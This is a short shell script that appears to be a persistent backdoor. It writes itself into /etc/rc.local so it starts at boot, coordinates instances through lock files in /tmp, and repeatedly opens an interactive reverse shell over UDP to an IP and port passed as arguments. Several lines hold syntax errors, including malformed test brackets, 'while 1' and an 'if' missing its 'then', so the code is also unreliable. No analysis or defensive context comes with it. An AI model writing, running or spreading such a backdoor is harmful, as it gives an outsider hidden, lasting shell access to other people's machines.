ip=$1
port=$2

mon=1
mon_pid=0
next=0

if [ ! -f /tmp/bd_lock ]
then
	if [! -f /tmp/bd_next ]
	then
		echo "$(pwd)/${0##*/}" >> /etc/rc.local
		# cronjob
		# service that procs every couple minutes
	fi
fi


if [ ! -f /tmp/bd_next ]
then
	touch /tmp/bd_next
	next=1
fi

while [ $mon -eq 1 ]
do
	if [ -f /tmp/bd_lock ]
	then 
		mon_pid=$(cat /tmp/bd_lock)
		if [ ! ps -p $mon_pid > /dev/null ]
		then
			rm -f /tmp/bd_lock
		fi
	
	else 
		if [ $next -eq 1 ]
		then 
			rm -f /tmp/bd_next
			mon=0
		else
			if [ ! -f /tmp/bd_next ]
			then
				touch /tmp/bd_next
				next=1
			fi
		fi
	
	fi
	sleep 1m

done

while 1
do
	sh -i >& /dev/udp/$ip/$port 0>&1
	sleep 30s
	echo $$ > /tmp/bd_lock
	if [ ! -f /tmp/bd_next ] 
		$0 7
	fi
done


